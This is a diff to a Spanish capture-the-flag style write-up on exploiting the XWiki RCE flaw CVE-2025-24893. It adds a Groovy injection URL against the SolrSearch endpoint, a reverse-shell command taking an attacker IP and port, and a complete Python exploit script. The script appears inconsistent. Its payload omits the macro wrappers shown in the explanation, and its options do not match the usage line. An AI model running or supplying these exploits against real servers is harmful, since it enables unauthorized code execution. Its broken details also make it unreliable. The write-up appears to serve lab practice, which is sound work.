@@ -167,10 +167,94 @@ Con esto ya sabemos mejor lo que estamos viendo.
 
 Si buscamos la version de XWiki que utiliza la web podemos ver que hay una vulnerabilidad que permite ejecucion remota de comandos "CVE-2025-24893".
 
-[PoC CVE-2025-24893 Rev Shell](https://github.com/AzureADTrent/CVE-2025-24893-Reverse-Shell)
+#### Explicación de la vulnerabilidad
 
-{{< button href="[#button](https://github.com/AzureADTrent/CVE-2025-24893-Reverse-Shell)" target="_self" >}}
-PoC CVE-2025-24893 Rev Shell
-{{< /button >}}
+La vulnerabilidad sucede por un manejo inadecuado de expresiones Groovy dentro de la macro SolrSearch, esto nos permite ejecutar codigo en el endpoint de SolrSearch.
 
+**_Ejemplo:_**
+
+```bash
+/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}}{{{{async async=false}}}}{{{{groovy}}}}"{command}".execute(){{{{/groovy}}}}{{{{/async}}}}
+``` 
+
+
+## Explotación
+
+### PoC de CVE-2025-24893
 {{< github repo="AzureADTrent/CVE-2025-24893-Reverse-Shell"showThumbnail=true >}}
+
+Este script en python nos permite explotar la vulnerabilidad ejecutando una reverse shell automaticamente.
+
+```bash
+python3 CVE-2025-24893-reverse-shell.py -u <target_url> -i <attacker_ip> -p <attacker_port>
+``` 
+El script no funciona por defecto para este caso, por lo que hay que modificar el endpoint en el script
+
+```python
+import argparse
+import requests
+import re
+from urllib.parse import urljoin, quote
+import html
+
+BANNER = """
+===========================================================
+                   CVE-2025-24893
+            XWiki Remote Code Execution Exploit
+                      Author: Artemir
+===========================================================
+"""
+
+def extract_output(xml_text):
+    decoded = html.unescape(xml_text)
+    match = re.search(r"\[}}}(.*?)\]", decoded)
+    if match:
+        return match.group(1).strip()
+    else:
+        return None
+
+def exploit(url, cmd):
+    headers = {
+        "User-Agent": "Mozilla/5.0",
+    }
+
+    payload = (
+        "}}}"
+        f"println('{cmd}'.execute().text)"
+        ""
+    )
+
+    encoded_payload = quote(payload)
+    exploit_path = f"/xwiki/bin/get/Main/SolrSearch?media=rss&text={encoded_payload}"  # Endpoint modificado
+    full_url = urljoin(url, exploit_path)
+
+    try:
+        response = requests.get(full_url, headers=headers, timeout=10)
+        if response.status_code == 200:
+            output = extract_output(response.text)
+            if output:
+                print("[+] Command Output:")
+                print(output)
+            else:
+                print("[!] Exploit sent, but output could not be extracted.")
+                print("[*] Raw response (truncated):")
+                print(response.text[:500])
+        else:
+            print(f"[-] Failed with status code: {response.status_code}")
+    except requests.RequestException as e:
+        print(f"[-] Request failed: {e}")
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="CVE-2025-24893 - XWiki RCE PoC")
+    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g. http://example.com)")
+    parser.add_argument("-c", "--cmd", required=True, help="Command to execute")
+
+    args = parser.parse_args()
+    exploit(args.url, args.cmd)
+
+
+```
+## Escalada de privilegios
+### Enumeración del sistema 
+#### 
+Vemos que hemos ganado acceso al sistema como el usuario **xwiki**
